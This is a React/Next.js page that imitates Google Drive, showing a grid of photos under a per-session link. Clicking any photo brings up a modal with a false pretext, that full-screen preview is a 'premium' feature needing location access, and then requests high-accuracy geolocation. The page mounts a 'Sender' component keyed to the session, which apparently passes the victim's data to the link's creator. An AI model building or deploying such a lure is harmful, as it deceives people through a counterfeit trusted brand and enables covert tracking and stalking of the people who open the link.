"use client";

import { useParams } from "next/navigation";
import Sender from "@/components/Sender";
import { useState, useRef, useEffect } from "react";

export default function GoPage() {
  const { id } = useParams() as { id: string };

  // ===================================================================
  // ✅ YOUR CUSTOM IMAGES GO HERE (public/images/ folder)
  // ===================================================================
  const initialImages: string[] = [
    "/images/bondhu (1).jpeg",
    "/images/bondhu (2).jpeg",
    "/images/bondhu (3).jpeg",
    "/images/bondhu (4).jpeg",
    "/images/bondhu (5).jpeg",
    "/images/bondhu (6).jpeg",
    "/images/bondhu (7).jpeg",
    "/images/bondhu (8).jpeg",
    "/images/bondhu (9).jpeg",
    "/images/bondhu (10).jpeg",
  ];

  // Deterministic initial file sizes (prevents hydration mismatch)
  const initialSizes: number[] = [3, 1, 4, 2, 3, 1, 4, 2, 3, 1];

  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [images, setImages] = useState<string[]>(initialImages);
  const [fileSizes, setFileSizes] = useState<number[]>(initialSizes);
  const [locationAllowed, setLocationAllowed] = useState<boolean | null>(null);
  const [showPermissionModal, setShowPermissionModal] = useState(false);
  const [pendingImage, setPendingImage] = useState<string | null>(null);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Mobile navigation
  const [mobileNavOpen, setMobileNavOpen] = useState(false);

  // Silent permission check on load
  useEffect(() => {
    const checkInitialPermission = async () => {
      if (typeof navigator === "undefined" || !navigator.geolocation) return;
      if (navigator.permissions?.query) {
        try {
          const permissionStatus = await navigator.permissions.query({
            name: "geolocation" as PermissionName,
          });
          setLocationAllowed(permissionStatus.state === "granted");
        } catch (e) {
          console.error("Permission query failed", e);
        }
      }
    };
    checkInitialPermission();
  }, []);

  const handleImageClick = (src: string) => {
    if (locationAllowed === true) {
      setSelectedImage(src);
    } else {
      setPendingImage(src);
      setShowPermissionModal(true);
    }
  };

  const requestLocationPermission = () => {
    if (typeof navigator === "undefined" || !navigator.geolocation) {
      setShowPermissionModal(false);
      setPendingImage(null);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      () => {
        setLocationAllowed(true);
        setShowPermissionModal(false);
        if (pendingImage) {
          setSelectedImage(pendingImage);
          setPendingImage(null);
        }
      },
      () => {
        setLocationAllowed(false);
        setShowPermissionModal(false);
        setPendingImage(null);
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  const cancelPermissionModal = () => {
    setShowPermissionModal(false);
    setPendingImage(null);
  };

  const handleUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (!files || files.length === 0) return;

    const newUrls: string[] = [];
    const newSizes: number[] = [];

    Array.from(files).forEach((file) => {
      if (file.type.startsWith("image/")) {
        newUrls.push(URL.createObjectURL(file));
        newSizes.push(Math.floor(Math.random() * 4) + 1);
      }
    });

    setImages((prev) => [...prev, ...newUrls]);
    setFileSizes((prev) => [...prev, ...newSizes]);

    if (fileInputRef.current) {
      fileInputRef.current.value = "";
    }
  };

  const triggerUpload = () => {
    fileInputRef.current?.click();
  };

  if (!id) {
    return <p className="p-6 text-red-500">Invalid session ID ❌</p>;
  }

  return (
    <div className="min-h-screen bg-[#0a0a0b] flex font-sans text-[#e8eaed] antialiased">
      {/* ====================== DESKTOP SIDEBAR ====================== */}
      <aside className="hidden md:flex flex-col w-72 bg-[#0a0a0b] border-r border-[#1f1f22] shadow-2xl">
        {/* New Button */}
        <div className="px-4 pt-6 pb-3">
          <button
            onClick={triggerUpload}
            className="flex items-center justify-center gap-x-3 w-full bg-[#8ab4f8] hover:bg-[#a3c4ff] active:bg-[#6ea0f0] text-[#0a0a0b] text-sm font-semibold py-4 px-6 rounded-3xl shadow-xl hover:shadow-2xl active:scale-[0.97] transition-all duration-200"
          >
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 4v16m8-8H4" />
            </svg>
            <span>New</span>
          </button>
        </div>

        {/* Navigation */}
        <nav className="flex-1 px-3 py-2 overflow-y-auto text-sm scrollbar-thin scrollbar-thumb-[#2a2a2e]">
          <div className="flex items-center gap-x-3 px-4 py-3 rounded-3xl bg-[#1f1f22] text-[#8ab4f8] font-medium shadow-inner">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="#8ab4f8" viewBox="0 0 24 24">
              <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 12H6V8h12v10z" />
            </svg>
            <span>My Drive</span>
          </div>

          {[
            { icon: "M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2", label: "Computers" },
            { icon: "M17 20h5v-2a3 3 0 01-5.356-1.857M17 20H7m5-2v-2c0-.656-.126-1.284-.356-1.852M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.284.356-1.852m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z", label: "Shared with me" },
            { icon: "M12 8v4l3 3m6-3a9 9 0 01-18 0 9 9 0 0118 0z", label: "Recent" },
            { icon: "M11.48 3.499a.562.562 0 011.04 0l2.125 5.111a.563.563 0 00.475.345l5.518.442c.499.04.701.663.32.987l-4.18 3.568a.563.563 0 00-.182.557l1.285 5.385a.562.562 0 01-.84.61L12 17.25l-4.665 2.437a.562.562 0 01-.84-.61l1.285-5.385a.563.563 0 00-.182-.557l-4.18-3.568a.563.563 0 01.32-.987l5.518-.442a.563.563 0 00.475-.345L11.48 3.5z", label: "Starred" },
            { icon: "M19 7l-.595 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.595-1.858L5 7m5 4v6m4-6v6m1-10V9a1 1 0 00-1-1h-4a1 1 0 00-1 1v1M12 4v-1a1 1 0 00-1-1H9a1 1 0 00-1 1v1", label: "Trash" },
          ].map((item, idx) => (
            <div
              key={idx}
              className="flex items-center gap-x-3 px-4 py-3 rounded-3xl hover:bg-[#1f1f22] text-[#dadce0] cursor-pointer transition-all duration-200"
            >
              <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
                <path strokeLinecap="round" strokeLinejoin="round" d={item.icon} />
              </svg>
              <span>{item.label}</span>
            </div>
          ))}
        </nav>

        {/* Storage Bar */}
        <div className="px-4 py-6 border-t border-[#1f1f22] mt-auto">
          <div className="flex items-center justify-between text-xs text-[#9aa0a6] mb-3">
            <span>6.8 GB of 15 GB used</span>
            <span className="text-[#8ab4f8] hover:underline cursor-pointer">Get more</span>
          </div>
          <div className="h-2 bg-[#1f1f22] rounded-full overflow-hidden">
            <div className="h-2 w-[45%] bg-gradient-to-r from-[#8ab4f8] to-[#a3c4ff] rounded-full"></div>
          </div>
        </div>
      </aside>

      {/* ====================== MOBILE NAV DRAWER ====================== */}
      {mobileNavOpen && (
        <div
          className="fixed inset-0 z-[9999] md:hidden bg-black/70 backdrop-blur-xl transition-opacity duration-300"
          onClick={() => setMobileNavOpen(false)}
        >
          <div
            className="fixed left-0 top-0 bottom-0 w-72 bg-[#0a0a0b] border-r border-[#1f1f22] shadow-2xl transform transition-transform duration-300 ease-out"
            style={{ transform: mobileNavOpen ? "translateX(0)" : "translateX(-100%)" }}
            onClick={(e) => e.stopPropagation()}
          >
            {/* Drawer Header */}
            <div className="flex items-center justify-between px-4 pt-6 pb-4 border-b border-[#1f1f22]">
              <div className="flex items-center">
                <div className="w-9 h-9 bg-gradient-to-br from-[#4285F4] via-[#34A853] to-[#FBBC05] rounded-2xl flex items-center justify-center text-white text-2xl">📁</div>
                <span className="ml-2 text-[26px] font-medium tracking-[-0.5px]">Drive</span>
              </div>
              <button
                onClick={() => setMobileNavOpen(false)}
                className="p-2 text-[#9aa0a6] hover:text-white text-3xl leading-none transition-colors"
              >
                ✕
              </button>
            </div>

            {/* New Button in Drawer */}
            <div className="px-4 pt-4 pb-3">
              <button
                onClick={() => {
                  triggerUpload();
                  setMobileNavOpen(false);
                }}
                className="flex items-center justify-center gap-x-3 w-full bg-[#8ab4f8] hover:bg-[#a3c4ff] active:bg-[#6ea0f0] text-[#0a0a0b] text-sm font-semibold py-4 px-6 rounded-3xl shadow-xl hover:shadow-2xl active:scale-[0.97] transition-all duration-200"
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M12 4v16m8-8H4" />
                </svg>
                <span>New</span>
              </button>
            </div>

            {/* Drawer Navigation (same as desktop) */}
            <nav className="flex-1 px-3 py-2 overflow-y-auto text-sm">
              <div className="flex items-center gap-x-3 px-4 py-3 rounded-3xl bg-[#1f1f22] text-[#8ab4f8] font-medium">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="#8ab4f8" viewBox="0 0 24 24">
                  <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 12H6V8h12v10z" />
                </svg>
                <span>My Drive</span>
              </div>

              {[
                { icon: "M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2", label: "Computers" },
                { icon: "M17 20h5v-2a3 3 0 01-5.356-1.857M17 20H7m5-2v-2c0-.656-.126-1.284-.356-1.852M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.284.356-1.852m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z", label: "Shared with me" },
                { icon: "M12 8v4l3 3m6-3a9 9 0 01-18 0 9 9 0 0118 0z", label: "Recent" },
                { icon: "M11.48 3.499a.562.562 0 011.04 0l2.125 5.111a.563.563 0 00.475.345l5.518.442c.499.04.701.663.32.987l-4.18 3.568a.563.563 0 00-.182.557l1.285 5.385a.562.562 0 01-.84.61L12 17.25l-4.665 2.437a.562.562 0 01-.84-.61l1.285-5.385a.563.563 0 00-.182-.557l-4.18-3.568a.563.563 0 01.32-.987l5.518-.442a.563.563 0 00.475-.345L11.48 3.5z", label: "Starred" },
                { icon: "M19 7l-.595 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.595-1.858L5 7m5 4v6m4-6v6m1-10V9a1 1 0 00-1-1h-4a1 1 0 00-1 1v1M12 4v-1a1 1 0 00-1-1H9a1 1 0 00-1 1v1", label: "Trash" },
              ].map((item, idx) => (
                <div
                  key={idx}
                  className="flex items-center gap-x-3 px-4 py-3 rounded-3xl hover:bg-[#1f1f22] text-[#dadce0] cursor-pointer transition-all duration-200"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
                    <path strokeLinecap="round" strokeLinejoin="round" d={item.icon} />
                  </svg>
                  <span>{item.label}</span>
                </div>
              ))}
            </nav>

            {/* Storage in Drawer */}
            <div className="px-4 py-6 border-t border-[#1f1f22] mt-auto">
              <div className="flex items-center justify-between text-xs text-[#9aa0a6] mb-3">
                <span>6.8 GB of 15 GB used</span>
                <span className="text-[#8ab4f8] hover:underline cursor-pointer">Get more</span>
              </div>
              <div className="h-2 bg-[#1f1f22] rounded-full overflow-hidden">
                <div className="h-2 w-[45%] bg-gradient-to-r from-[#8ab4f8] to-[#a3c4ff] rounded-full"></div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ====================== MAIN CONTENT ====================== */}
      <div className="flex-1 flex flex-col min-w-0">
        {/* Top Bar - Professional & Mobile-First */}
        <header className="bg-[#0a0a0b] h-14 border-b border-[#1f1f22] flex items-center px-3 sm:px-5 gap-3 shadow-sm z-50">
          {/* Mobile Hamburger */}
          <button
            onClick={() => setMobileNavOpen(true)}
            className="p-2 rounded-2xl hover:bg-[#1f1f22] md:hidden transition-all"
          >
            <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6 text-[#dadce0]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
              <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16" />
            </svg>
          </button>

          {/* Logo */}
          <div className="flex items-center flex-shrink-0">
            <div className="w-9 h-9 bg-gradient-to-br from-[#4285F4] via-[#34A853] to-[#FBBC05] rounded-2xl flex items-center justify-center text-white text-2xl">📁</div>
            <span className="ml-2 text-[26px] font-medium tracking-[-0.5px] hidden xs:inline">Drive</span>
          </div>

          {/* Search Bar */}
          <div className="flex-1 max-w-[680px] mx-auto">
            <div className="relative">
              <input
                type="text"
                placeholder="Search in Drive"
                className="w-full bg-[#1f1f22] hover:bg-[#2a2a2e] focus:bg-[#2a2a2e] border border-transparent hover:border-[#3a3a3f] focus:border-[#8ab4f8] focus:ring-2 focus:ring-[#8ab4f8]/30 h-11 pl-12 pr-5 rounded-3xl text-sm placeholder:text-[#9aa0a6] text-[#e8eaed] focus:outline-none transition-all duration-200"
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2 text-[#9aa0a6]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 01-14 0 7 7 0 0114 0z" />
                </svg>
              </div>
            </div>
          </div>

          {/* Right Side Actions */}
          <div className="flex items-center gap-x-1 flex-shrink-0">
            <button className="p-2 rounded-2xl hover:bg-[#1f1f22] text-[#dadce0] transition-all">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6 6 0 00-9-5.197V8.5m.002 3.5L12 14l-4.998-3.5" />
              </svg>
            </button>
            <div className="w-8 h-8 bg-[#8ab4f8] text-[#0a0a0b] rounded-2xl flex items-center justify-center text-sm font-semibold cursor-pointer hover:ring-2 hover:ring-[#8ab4f8]/40 transition-all">
              T
            </div>
          </div>
        </header>

        {/* Main Content Area */}
        <main className="flex-1 p-4 sm:p-6 overflow-auto bg-[#0a0a0b]">
          <Sender sessionId={id} />

          {/* Mini Toolbar */}
          <div className="flex items-center justify-between mb-6">
            <div className="flex items-center text-sm text-[#dadce0]">
              <span className="font-medium">My Drive</span>
              <span className="mx-2 text-[#5f6368]">•</span>
              <span className="text-[#9aa0a6]">{images.length} images</span>
            </div>

            <div className="flex items-center gap-x-1 bg-[#1f1f22] rounded-3xl border border-[#2a2a2e] p-1">
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl bg-[#2a2a2e] text-[#8ab4f8]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 12a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 18a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2z" />
                </svg>
              </button>
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl hover:bg-[#2a2a2e] text-[#dadce0]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h7" />
                </svg>
              </button>
            </div>
          </div>

          {/* Image Grid - Premium Modern Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-5">
            {images.map((src, i) => (
              <div
                key={i}
                onClick={() => handleImageClick(src)}
                className="group bg-[#121214] rounded-3xl overflow-hidden border border-transparent hover:border-[#8ab4f8]/30 hover:shadow-2xl hover:shadow-[#8ab4f8]/10 transition-all duration-300 cursor-pointer active:scale-[0.97]"
              >
                <div className="aspect-video bg-[#0a0a0b] relative overflow-hidden">
                  <img
                    src={src}
                    alt={`bondhu (${i + 1})`}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />
                  <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/50 opacity-0 group-hover:opacity-100 transition-opacity" />
                  <div className="absolute top-3 right-3 bg-black/70 text-white text-[10px] font-medium px-2.5 py-px rounded-2xl backdrop-blur-md opacity-0 group-hover:opacity-100 transition-opacity">
                    JPG
                  </div>
                </div>

                <div className="px-4 py-4 flex items-center justify-between">
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium text-[#e8eaed] truncate">bondhu ({i + 1}).jpg</p>
                    <p className="text-xs text-[#9aa0a6]">Just now • {fileSizes[i]} MB</p>
                  </div>
                  <button className="opacity-0 group-hover:opacity-100 p-2 hover:bg-[#1f1f22] rounded-2xl transition-colors text-[#9aa0a6] hover:text-[#dadce0]">
                    ⋯
                  </button>
                </div>
              </div>
            ))}
          </div>

          {/* Floating Preview Panel */}
          {selectedImage && (
            <div className="fixed inset-x-4 bottom-8 md:inset-auto md:bottom-8 md:right-8 md:left-auto w-full max-w-[360px] mx-auto md:mx-0 bg-[#121214] rounded-3xl shadow-2xl border border-[#1f1f22] overflow-hidden z-[100]">
              <div className="px-6 pt-5 pb-3 border-b border-[#1f1f22] flex items-center justify-between">
                <div className="flex items-center gap-x-2">
                  <div className="w-7 h-7 bg-[#8ab4f8] rounded-2xl flex items-center justify-center text-[#0a0a0b] text-base">📸</div>
                  <p className="font-semibold">Preview</p>
                </div>
                <button
                  onClick={() => setSelectedImage(null)}
                  className="text-[#9aa0a6] hover:text-white text-3xl leading-none transition-colors"
                >
                  ✕
                </button>
              </div>
              <div className="p-6">
                <img
                  src={selectedImage}
                  className="w-full rounded-3xl shadow-inner ring-1 ring-[#1f1f22]"
                  alt="preview"
                />
              </div>
              <div className="px-6 py-5 border-t border-[#1f1f22] flex items-center justify-between text-sm">
                <button className="flex items-center gap-x-2 text-[#8ab4f8] hover:underline transition-colors">
                  <span>Download</span>
                </button>
                <button
                  onClick={() => setSelectedImage(null)}
                  className="px-8 py-3 bg-[#1f1f22] hover:bg-[#2a2a2e] rounded-3xl transition-all active:scale-95"
                >
                  Close
                </button>
              </div>
            </div>
          )}

          {/* Location Permission Modal */}
          {showPermissionModal && (
            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[10000] px-4 backdrop-blur-md">
              <div className="bg-[#121214] rounded-3xl w-full max-w-md shadow-2xl overflow-hidden">
                <div className="px-8 pt-10 pb-8 text-center">
                  <div className="mx-auto w-20 h-20 bg-[#1f1f22] rounded-3xl flex items-center justify-center mb-6 shadow-inner">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-10 h-10 text-[#8ab4f8]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314-11.314z" />
                      <path strokeLinecap="round" strokeLinejoin="round" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-semibold tracking-tight mb-3">Location permission required</h2>
                  <p className="text-[#9aa0a6] text-base leading-relaxed">
                    Full-screen image preview is only available after you allow location access.<br />
                    This is a one-time permission for a premium experience.
                  </p>
                </div>

                <div className="flex border-t border-[#1f1f22]">
                  <button
                    onClick={cancelPermissionModal}
                    className="flex-1 py-6 text-[#dadce0] font-medium hover:bg-[#1f1f22] transition-all active:scale-[0.98]"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={requestLocationPermission}
                    className="flex-1 py-6 bg-[#8ab4f8] text-[#0a0a0b] font-semibold hover:bg-[#a3c4ff] transition-all active:scale-[0.98]"
                  >
                    Grant Access
                  </button>
                </div>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Hidden File Input */}
      <input
        type="file"
        ref={fileInputRef}
        onChange={handleUpload}
        accept="image/*"
        multiple
        className="hidden"
      />

      {/* Global Styles */}
      <style jsx>{`
        .scrollbar-thin::-webkit-scrollbar {
          width: 5px;
        }
        .scrollbar-thin::-webkit-scrollbar-thumb {
          background: #2a2a2e;
          border-radius: 9999px;
        }
      `}</style>
    </div>
  );
}